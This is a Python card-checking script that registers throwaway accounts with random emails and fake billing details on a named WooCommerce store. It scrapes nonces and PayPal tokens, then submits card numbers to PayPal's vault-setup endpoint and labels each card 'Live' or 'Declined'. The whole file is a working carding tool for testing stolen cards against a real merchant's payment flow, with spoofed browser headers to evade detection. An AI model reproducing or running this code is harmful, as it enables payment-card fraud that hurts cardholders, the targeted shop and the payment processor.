import requests
import user_agent
import time
import os
from faker import Faker
import re
import string , random
from bs4 import BeautifulSoup
import json
from colorama import Fore
from faker import Faker
from colorama import Back, Fore, Style, init
O =  '\033[1;31m'
Z =  '\033[1;37m' 
F = '\033[1;32m' 
B = '\033[2;36m' 
X = '\033[1;33m' 
C = '\033[2;35m' 



fake = Faker()


card_count = 0

def Tele(ccx):
    
    card_count += 1
    if card_count > 10:
		
        card_count = 1
    ccx = ccx.strip().split('\n')[0]
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]
    
    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
            
        return f"{name}{number}@gmail.com"
    acc = (generate_random_account())
    r = requests.session()

    user = user_agent.generate_user_agent()
    headers = {
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': user,
}

    response = r.post('https://stickysituationhandscrub.com/my-account/', headers=headers)
    #time.sleep(5)
    try:
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    except:
        pass  
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://stickysituationhandscrub.com',
        'Referer': 'https://stickysituationhandscrub.com/my-account/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'email': acc,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_session_entry': 'https://stickysituationhandscrub.com/my-account/',
        'wc_order_attribution_session_start_time': '2025-03-08 15:57:03',
        'wc_order_attribution_session_pages': '13',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    response = r.post('https://stickysituationhandscrub.com/my-account/', headers=headers, data=data)



			
    #time.sleep(5)
    headers = {
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': user,
			}
    response = r.post(
				'https://stickysituationhandscrub.com/my-account/edit-address/billing/',
				headers=headers,
			)
    try:
        address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
    except:
        pass  
    headers = {
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': user,
			}

    data = {
				'billing_first_name': fake.first_name(),
				'billing_last_name': fake.last_name(),
				'billing_company': fake.company(),
				'billing_country': 'US',
				'billing_address_1': fake.street_address(),
				'billing_address_2': f"Apartment {random.randint(1, 99)}",
				'billing_city': fake.city(),
				'billing_state': 'NY',
				'billing_postcode': '10080',
				'billing_phone': fake.phone_number(),
				'billing_email': acc,
				'save_address': 'Save address',
				'woocommerce-edit-address-nonce': address,
				'_wp_http_referer': '/my-account/edit-address/billing/',
				'action': 'edit_address',
			}

    response = r.post(
				'https://stickysituationhandscrub.com/my-account/edit-address/billing/',
				headers=headers,
				data=data,
			)


    headers = {
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
				'priority': 'u=0, i',
				'referer': 'https://stickysituationhandscrub.com/my-account/payment-methods/',
				'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': user,
			}

    response = r.get('https://stickysituationhandscrub.com/my-account/add-payment-method/', headers=headers)
    data = response.text
    try:   
        setup_token_nonce = re.search(r'"endpoint":"\\\/\?wc-ajax=ppc-create-setup-token","nonce":"(.*?)"', data).group(1)
    except:
        pass  
    try:
        payment_token_nonce = re.search(r'"endpoint":"\\\/\?wc-ajax=ppc-create-payment-token","nonce":"(.*?)"', data).group(1)
    except:
        pass  
    try:
        id_token = re.search(r'"id_token":"(.*?)"', response.text).group(1)
    except:
        pass  
    try:
        client_id = re.search(r'"client_id":"(.*?)"', response.text).group(1)
    except:
        pass  
    headers = {
        'accept': '*/*',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://stickysituationhandscrub.com',
        'priority': 'u=1, i',
        'referer': 'https://stickysituationhandscrub.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }

    params = {
        'wc-ajax': 'ppc-create-setup-token',
    }

    json_data = {
        'nonce': setup_token_nonce,
        'payment_method': 'ppcp-credit-card-gateway',
        'verification_method': 'SCA_WHEN_REQUIRED',
    }

    response = r.post('https://stickysituationhandscrub.com/', params=params, headers=headers, json=json_data)
    try:
        id = response.json()['data']['id']
    except:
        pass
    headers = {
        'accept': 'application/json',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'disable-set-cookie': 'true',
        'origin': 'https://www.paypal.com',
        'priority': 'u=1, i',
        'referer': 'https://www.paypal.com/smart/card-field?style.input.appearance=none&style.input.color=rgb(0%2C%200%2C%200)&style.input.direction=ltr&style.input.font-family=%22Inter%20var%22%2C%20-apple-system%2C%20BlinkMacSystemFont%2C%20%22Helvetica%20Neue%22%2C%20Helvetica%2C%20sans-serif&style.input.font-size=16px&style.input.font-size-adjust=none&style.input.font-stretch=100%25&style.input.font-style=normal&style.input.font-variant=normal&style.input.font-variant-alternates=normal&style.input.font-variant-caps=normal&style.input.font-variant-east-asian=normal&style.input.font-variant-ligatures=normal&style.input.font-variant-numeric=normal&style.input.font-weight=400&style.input.letter-spacing=-0.24px&style.input.line-height=16px&style.input.opacity=1&style.input.padding-bottom=15px&style.input.padding-left=18px&style.input.padding-right=18px&style.input.padding-top=15px&style.input.text-shadow=none&style.input.-webkit-tap-highlight-color=rgba(0%2C%200%2C%200%2C%200.18)&type=expiry&clientID=AeV8Lv0APArLp07wddK_Lpe78IDvaK9Nxp2-BUX9jKbkWipjwJNggSQvdPvWrxV-Sa6S5OO3WT49vgBo&sessionID=uid_59117341c5_mji6mjm6mtk&clientMetadataID=uid_59117341c5_mji6mjm6mtk&cardFieldsSessionID=uid_8f28f02307_mji6mjq6ndu&env=production&debug=false&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVWOEx2MEFQQXJMcDA3d2RkS19McGU3OElEdmFLOU54cDItQlVYOWpLYmtXaXBqd0pOZ2dTUXZkUHZXcnhWLVNhNlM1T08zV1Q0OXZnQm8mbWVyY2hhbnQtaWQ9Tko2TkxaWFlFVk5LOCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMiLCJhdHRycyI6eyJkYXRhLXVpZCI6InVpZF9uanRtb2lncXV1Z2ljdHRjY3dxemRlc3ZidGhoeGUifX0&disable-card=&currency=USD&intent=capture&commit=true&vault=false&sdkCorrelationID=f69532615c7de&merchantID.0=NJ6NLZXYEVNK8',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': user,
        'x-app-name': 'smart-payment-buttons',
    }

    json_data = {
        'query': '\n      mutation UpdateVaultSetupToken(\n        $clientID: String!\n        $vaultSetupToken: String!\n        $paymentSource: PaymentSource\n        $idToken: String\n      ) {\n        updateVaultSetupToken(\n          clientId: $clientID\n          vaultSetupToken: $vaultSetupToken\n          paymentSource: $paymentSource\n          idToken: $idToken\n        ) {\n          id,\n          status,\n          links {\n            rel, href\n          }\n        }\n      }',
        'variables': {
            'clientID': client_id,
            'vaultSetupToken': id,
            'paymentSource': {
                'card': {
                    'number': n,
                    #'securityCode': '543',
                    'expiry': f'20{yy}-{mm}',
                },
            },
            'idToken': id_token,
        },
    }

    response = r.post('https://www.paypal.com/graphql?UpdateVaultSetupToken', headers=headers, json=json_data)

    mero = response.json()
    if mero.get("data") and mero["data"].get("updateVaultSetupToken"):
        status = mero["data"]["updateVaultSetupToken"].get("status")
				
        if status == "APPROVED":
            return 'Live'

        else:
            return 'Declined'
    else:
        return 'Declined'
				
